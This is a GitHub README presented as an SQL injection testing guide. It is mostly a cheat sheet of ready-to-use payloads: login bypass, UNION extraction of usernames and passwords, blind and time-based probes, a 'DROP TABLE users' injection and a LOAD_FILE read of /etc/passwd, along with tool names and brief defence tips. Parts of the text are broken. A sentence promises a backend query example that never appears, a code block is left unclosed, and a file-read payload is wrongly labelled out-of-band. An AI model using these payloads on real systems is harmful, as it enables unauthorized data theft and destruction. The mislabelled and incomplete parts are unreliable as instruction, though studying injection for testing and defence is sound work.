# SQL-Inject
Basic SQL injections


README.md

# 🔥 SQL Injection Testing Guide  

This repository contains a categorized list of **SQL Injection (SQLi) techniques** sorted by difficulty level. These techniques are intended for **educational purposes and penetration testing** only.  

## ⚠️ Disclaimer  
This repository is for **legal security research** and **ethical hacking** only. Do not use these techniques on **live systems without explicit permission**. The author is not responsible for any misuse of this information.  

---

## 📌 SQL Injection Categories  

### 🟢 **Easy (No Protection / Basic Security Flaws)**  

#### **1. Basic Authentication Bypass**  
Bypass login pages when the input is directly concatenated into SQL queries.  
```sql
' OR '1'='1' --  

admin' --  

	Works when backend queries look like:

2. UNION-Based SQL Injection

Extracts data when column count is known.

' UNION SELECT 1,2,3 --  

3. Error-Based SQL Injection

Forces database errors to reveal system details.

' AND 1=CONVERT(int,@@version) --  

🟡 Medium (Some Security in Place, But Bypasses Exist)

4. Blind SQL Injection (Boolean-Based)

Used when direct query output is not visible.

' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) --  

5. Time-Based SQL Injection (Blind Extraction via Delays)

Detects SQLi via response time delays.

' OR IF(1=1, SLEEP(5), 0) --  

6. Bypassing Filters Using Encoding / Commenting

Encoded attacks to bypass basic protections.

admin' %23  

	%23 is URL encoding for # (used to comment out the rest of the SQL query).

7. Hex Encoding to Avoid Detection

Bypasses WAFs using hex representation.

0x61646d696e -- (Hex for 'admin')  

🔴 Hard (WAF, Parameterized Queries, Advanced Protections)

8. Second-Order SQL Injection

Malicious data is stored and later executed.

test'; DROP TABLE users; --  

9. Bypassing WAF with String Concatenation

Avoids detection by breaking up keywords.

' UNION SELECT 1,CONCAT(user,0x3a,password) FROM users --  

	0x3a is the hex for :

10. Advanced Time-Based Injection

Extracts database details via conditional delays.

' OR (SELECT CASE WHEN (LENGTH(database())=5) THEN SLEEP(5) ELSE 1 END) --  

11. Out-of-Band (OOB) Attacks

Exploits functions to access server files.

' OR LOAD_FILE('/etc/passwd') --  

🔍 Testing Tools
	•	SQLMap – Automated SQL injection tool.
	•	Burp Suite – Web security testing tool.
	•	Damn Vulnerable Web Application (DVWA) – Practice environment for testing SQLi.

🔒 How to Protect Against SQL Injection
	•	Use parameterized queries instead of string concatenation.
	•	Sanitize user inputs (whitelist, escaping, etc.).
	•	Implement Web Application Firewalls (WAFs) to detect and block attacks.

⚠️ Legal Warning

Testing these SQL injection techniques on unauthorized systems is illegal. Always get explicit permission before performing penetration tests.

🛠 Contributions

Feel free to submit pull requests with new techniques or improvements.

🚀 Stay ethical & happy hacking!

---

### **How to Use It**  
1. Copy the above text into a new `README.md` file in your GitHub repository.  
2. Push it to GitHub.  
3. (Optional) Add example vulnerable applications for testing (like DVWA).  
